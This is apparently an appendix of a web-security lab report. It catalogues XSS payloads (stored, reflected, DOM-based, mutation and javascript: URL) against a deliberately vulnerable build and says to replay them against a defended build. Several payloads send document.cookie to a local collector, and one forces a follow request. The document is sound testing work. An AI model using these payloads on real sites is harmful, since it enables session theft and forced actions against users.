# Appendix C — Payload catalogue

Every payload has a stable identifier reused across the findings and results
tables (report §6.3). In the lab, replace the harmless `alert(1)` marker with a
beacon to the collector to prove exfiltration, e.g.:

```
new Image().src='http://127.0.0.1:9000/collect?c='+encodeURIComponent(document.cookie)
```

> ⚠️ All payloads are for the **vulnerable** build in the isolated lab only.

---

## XSS-S-01 — Stored XSS (display name / post body / bio)

**Where:** set as your display name (Settings) or post body; it executes when
the feed/profile renders it via `innerHTML`.

```html
"><img src=x onerror="new Image().src='http://127.0.0.1:9000/collect?c='+encodeURIComponent(document.cookie)">
```

Simple marker:

```html
<img src=x onerror=alert(document.domain)>
```

**Impact:** persists in the DB; fires for every viewer of the feed → session
theft (cookie has no `HttpOnly` in the vulnerable build), defacement, worm
potential.

---

## XSS-R-01 — Reflected XSS (server-rendered search)

**Where:** `GET /search?q=` echoes the query into the HTML response.

```
/search?q=<script>alert(document.domain)</script>
```

```
/search?q="><svg onload=alert(1)>
```

---

## XSS-D-01 — DOM-based XSS (hash router → innerHTML)

**Where:** the SPA reads `location.hash` and writes the search term into the
page via `innerHTML` (`DomSearchBanner`).

```
#/search?q=<img src=x onerror=alert('dom-xss')>
```

Full URL form:

```
http://localhost:8080/#/search?q=<img src=x onerror=alert(document.cookie)>
```

---

## XSS-M-01 — Mutation XSS (link preview, naive strip + re-parse)

**Where:** `GET /render/preview?html=` runs a naive `<script>` strip then the
result is re-parsed as `innerHTML`. Classic mXSS shapes survive the strip and
mutate into script on re-parse.

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

```html
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
```

```html
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

---

## XSS-P-01 — `javascript:` URL (profile website / link)

**Where:** profile `website` (or a post link) rendered into an `href` with no
scheme allow-list.

```
javascript:alert(document.domain)
```

```
javascript:fetch('/api/follow/attacker',{method:'POST'})
```

**Impact:** clicking the link runs script in the victim's session (forced
action / XSS-driven CSRF).

---

## Verification (defended build)

Replay each payload above against the defended build (`BUILD_MODE=defended`).
Expected result for all: **rendered as inert text / blocked**, with the
responsible control per the mapping in the top-level `README.md`.
